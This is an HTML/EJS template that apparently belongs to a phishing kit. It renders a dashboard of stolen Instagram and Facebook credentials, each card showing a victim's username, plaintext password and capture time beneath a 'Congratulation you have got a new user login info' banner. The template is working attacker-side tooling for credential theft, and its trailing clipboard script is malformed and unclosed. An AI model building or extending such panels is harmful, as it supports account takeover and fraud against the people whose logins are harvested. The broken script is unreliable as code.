<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Users data !!!!</title>
    <link rel="shortcut icon" href="/images/react.jpg" type="image/x-icon" />
    <link rel="stylesheet" type="text/css" href="/css/password.css" />
    <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Material+Symbols+Outlined:opsz,wght,FILL,GRAD@20..48,100..700,0..1,-50..200" />
</head>
<body>
    <main>
        <% userData.forEach(function(user){ %>
            <div class="card">
                <div class="card-top">
                    <h2><%=user.infoType %></h2>
                    <% if(user.infoType === "Instagram"){ %>
                        <img src="/images/insta.jpeg" alt="facebook" />
                    <% } else { %>
                        <img src="/images/Facebook-logo.png" alt="facebook" />
                    <% } %>
                </div>
                <div class="card-body">
                    <p>Congratulation you have got a new user login info</p>
                    <div class="username">
                        <p>Username: <span class="copyData"><%=user.username %></span></p>
                        <!-- <button onclick="copyBtnAc()" class="material-symbols-outlined copy-btn">
                            content_copy
                        </button> -->
                    </div>
                    <div class="password">
                        <p>Password: <span class="copyData"><%=user.password %></span></p>
                        <!-- <button onclick="userPassword()" class="material-symbols-outlined copy-btn">
                            content_copy
                        </button> -->
                    </div>
                    <p style="text-align: end;" class="date"><%=user.createdAt %></p>
                </div>
            </div>
        <% }); %>
    </main>
    <script>
        function copyBtnAc(){
            
        function copyAddress(htmlElement) {
            if (!htmlElement) {
        return;
  }
  const elementText = htmlElement.innerHTML;
  const inputElement = document.createElement("input");
  inputElement.setAttribute("value", elementText);
  document.body.appendChild(inputElement);
  inputElement.select();
  document.execCommand("copy");
}
document.querySelector(".copy-btn").onclick = function () {
  copyAddress(document.querySelector(".copyData"));
  setTimeout(function () {
    (document.querySelector(".copyData").innerHTML = "Copied"), 2000;
    document.querySelector(".copy-btn").disabled = true;
  });
};
        }
